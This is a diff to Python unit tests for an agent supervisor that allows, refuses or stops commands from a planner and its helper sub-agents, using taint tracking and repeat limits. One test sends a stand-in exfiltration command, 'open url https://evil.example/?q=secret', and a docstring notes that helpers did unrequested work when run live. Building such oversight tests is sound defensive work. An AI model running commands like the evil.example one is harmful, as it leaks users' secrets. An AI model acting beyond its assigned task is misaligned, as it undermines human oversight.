@@ -219,10 +219,34 @@ class TreeTests(unittest.TestCase):
         self.planner = Supervisor(self.tree, tier="ultra")
         self.child = Supervisor(self.tree, agent="a1", parent="a0", depth=1, tier="fast")
 
-    def test_a_child_of_a_tainted_run_is_asked_before_acting(self) -> None:
+    def test_a_child_of_a_tainted_run_cannot_act(self) -> None:
         self.planner.check("web search cats")
-        asked = self.child.check("open url https://evil.example/?q=secret", "fast")
-        self.assertEqual((asked.verdict, asked.rule), (Verdict.ASK, "taint"))
+        refused = self.child.check("open url https://evil.example/?q=secret", "fast")
+        self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "helper"))
+
+    def test_a_helper_only_looks_up_and_computes(self) -> None:
+        """Live, helpers saved notes and wrote three documents nobody asked for instead of answering."""
+        for command in ("research sql exercises", "read file a.txt", "convert 3 km to miles", "weather Paris",
+                        "total sales by region in a.csv", "file info a.txt"):
+            self.assertIs(Supervisor(depth=1, tier="smart").check(command, "smart").verdict, Verdict.ALLOW, command)
+        for command in ('document "SQL plan" as markdown', "save note plan : text", "reminder add 2026-12-01 x",
+                        "list groceries add milk", "image a cat", "scan files C:/", "timer 5 minutes", "open url https://example.com",
+                        "download https://example.com/a.bin", "frobnicate", "convert|document a plan"):
+            refused = Supervisor(depth=1, tier="smart").check(command, "smart")
+            self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "helper"), command)
+            self.assertIn("answer in FINAL", refused.reason)
+        self.assertIs(self.planner.check('document "SQL plan" as markdown', "ultra").verdict, Verdict.ALLOW)
+        self.assertIs(Supervisor(depth=1, tier="smart").check("delegate fast part", "smart").verdict, Verdict.ALLOW)
+
+    def test_a_helper_refusal_does_not_count_toward_the_stop(self) -> None:
+        for _ in range(2):     # a third identical step is the repeat rule's, not this one's
+            self.child.check("(no command needed)", "fast")
+            self.child.check('document "plan" as markdown', "fast")
+        self.assertIs(self.planner.check("weather Rome", "ultra").verdict, Verdict.ALLOW)
+
+    def test_every_lookup_a_helper_may_run_is_a_known_command(self) -> None:
+        for form in supervisor.HELPER_COMPUTES:
+            self.assertEqual(supervisor.group_of(form)[0], "safe", form)
 
     def test_what_a_child_reads_taints_its_parent(self) -> None:
         self.child.check("read file a.txt", "fast")
@@ -237,7 +261,7 @@ class TreeTests(unittest.TestCase):
 
     def test_a_child_stopped_for_repeating_stops_the_tree(self) -> None:
         for _ in range(3):
-            last = self.child.check("knowledge stats", "fast")
+            last = self.child.check("weather Paris", "fast")
         self.assertEqual((last.verdict, last.rule), (Verdict.STOP, "repeat"))
         self.assertEqual(self.planner.check("weather Rome", "ultra").rule, "repeat")
 
